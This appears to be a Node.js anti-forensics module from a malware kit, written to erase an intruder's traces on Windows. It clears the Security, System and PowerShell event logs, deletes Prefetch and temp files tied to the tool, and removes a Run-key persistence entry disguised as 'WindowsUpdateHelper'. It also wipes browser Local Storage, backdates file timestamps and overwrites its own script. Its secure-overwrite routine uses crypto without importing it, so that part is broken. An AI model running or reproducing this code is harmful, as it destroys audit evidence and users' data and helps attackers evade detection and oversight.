const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const IS_WIN = process.platform === 'win32';

function runCmd(cmd) {
  try { return execSync(cmd, { shell: 'cmd.exe', encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] }); }
  catch (_) { return ''; }
}

// ─── LOG CLEANING ─────────────────────────────────────────────────────────────
function cleanWindowsLogs() {
  if (!IS_WIN) return;
  const logs = [
    'System',
    'Security',
    'Application',
    'Windows PowerShell',
    'Microsoft-Windows-PowerShell/Operational'
  ];
  for (const log of logs) {
    try {
      runCmd(`wevtutil cl "${log}" 2>nul`);
    } catch (_) { }
  }
}

// ─── TEMP FILES ───────────────────────────────────────────────────────────────
function cleanTempFiles() {
  const tempPaths = [
    os.tmpdir(),
    path.join(os.homedir(), 'AppData', 'Local', 'Temp'),
    path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Windows', 'Temp')
  ];
  for (const tempDir of tempPaths) {
    if (fs.existsSync(tempDir)) {
      try {
        const files = fs.readdirSync(tempDir);
        for (const file of files) {
          try {
            const fullPath = path.join(tempDir, file);
            if (file.includes('konu') || file.includes('tmp') || file.includes('exe')) {
              fs.unlinkSync(fullPath);
            }
          } catch (_) { }
        }
      } catch (_) { }
    }
  }
}

// ─── PREFETCH ─────────────────────────────────────────────────────────────────
function cleanPrefetch() {
  if (!IS_WIN) return;
  const prefetchPath = path.join(process.env.SystemRoot, 'System32', 'Prefetch');
  if (fs.existsSync(prefetchPath)) {
    try {
      const files = fs.readdirSync(prefetchPath);
      for (const file of files) {
        if (file.includes('NODE') || file.includes('KONU')) {
          try { fs.unlinkSync(path.join(prefetchPath, file)); } catch (_) { }
        }
      }
    } catch (_) { }
  }
}

// ─── TIMESTOMPING ─────────────────────────────────────────────────────────────
function timestomp(filePath) {
  if (!fs.existsSync(filePath)) return;
  try {
    const now = new Date();
    const past = new Date(now.getTime() - 86400000 * 7); // 7 days ago
    fs.utimesSync(filePath, past, past);
  } catch (_) { }
}

// ─── DISK OVERWRITE ───────────────────────────────────────────────────────────
function overwriteFile(filePath) {
  if (!fs.existsSync(filePath)) return;
  try {
    const stats = fs.statSync(filePath);
    const size = stats.size;
    const fd = fs.openSync(filePath, 'r+');
    const buffer = Buffer.alloc(size);
    crypto.randomBytes(size).copy(buffer);
    fs.writeSync(fd, buffer, 0, size, 0);
    fs.closeSync(fd);
    fs.unlinkSync(filePath);
  } catch (_) { }
}

// ─── REGISTRY CLEANUP ─────────────────────────────────────────────────────────
function cleanRegistry() {
  if (!IS_WIN) return;
  const keys = [
    'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper',
    'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper'
  ];
  for (const key of keys) {
    try { runCmd(`reg delete "${key}" /f 2>nul`); } catch (_) { }
  }
}

// ─── BROWSER CLEANUP ──────────────────────────────────────────────────────────
function cleanBrowserData() {
  const home = os.homedir();
  const browsers = [
    path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default'),
    path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default'),
    path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
  ];
  for (const browserDir of browsers) {
    if (fs.existsSync(browserDir)) {
      try {
        const clearCmd = process.platform === 'win32'
          ? `powershell -Command "Remove-Item '${browserDir}\\Local Storage\\*' -Recurse -Force"`
          : `rm -rf "${browserDir}/Local Storage/*"`;
        runCmd(clearCmd);
      } catch (_) { }
    }
  }
}

// ─── MAIN CLEANUP ─────────────────────────────────────────────────────────────
async function traces() {
  try {
    // Clean logs first
    cleanWindowsLogs();
    // Clean temp files
    cleanTempFiles();
    // Clean prefetch
    cleanPrefetch();
    // Clean registry
    cleanRegistry();
    // Clean browser data
    cleanBrowserData();
    // Timestomp executable
    timestomp(process.execPath);
    // Overwrite original file if exists
    const selfPath = process.argv[1] || process.execPath;
    if (selfPath && fs.existsSync(selfPath)) {
      overwriteFile(selfPath);
    }
    return true;
  } catch (_) { return false; }
}

module.exports = { traces, cleanWindowsLogs, cleanTempFiles, cleanPrefetch, timestomp, overwriteFile, cleanRegistry, cleanBrowserData };